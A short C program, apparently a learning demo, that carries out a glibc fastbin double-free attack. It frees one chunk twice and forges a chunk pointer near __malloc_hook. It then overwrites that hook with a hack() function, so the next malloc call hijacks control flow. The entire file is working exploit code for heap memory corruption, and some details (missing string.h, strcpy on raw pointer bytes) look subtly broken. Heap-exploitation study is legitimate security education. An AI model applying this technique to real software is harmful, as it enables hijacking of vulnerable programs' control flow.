#define _GNU_SOURCE     /* for RTLD_NEXT */
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

char *msg = "Hello, User\n";

void hack()
{
    msg = "Hack\n";
}

int main()
{
    printf("allocate memory of printf\n");
    char *a = malloc(0x60);
    char *b = malloc(0x60);

    free(a);
    free(b);
    free(a);

    void *fp = dlsym(RTLD_NEXT, "__malloc_hook");
    long long ll = (long long)fp - 0x10 - 0x3;

    char buf[9];
    *(long long *)buf = ll;
    buf[8] = '\0';

    char *c = malloc(0x60);
    strcpy(c, buf);

    malloc(0x60);
    malloc(0x60);
    char *d = malloc(0x60);

    *(long long *)buf = (long long)hack;
    strcpy(&d[3], buf);

    malloc(0x20);

    printf("%s", msg);
}
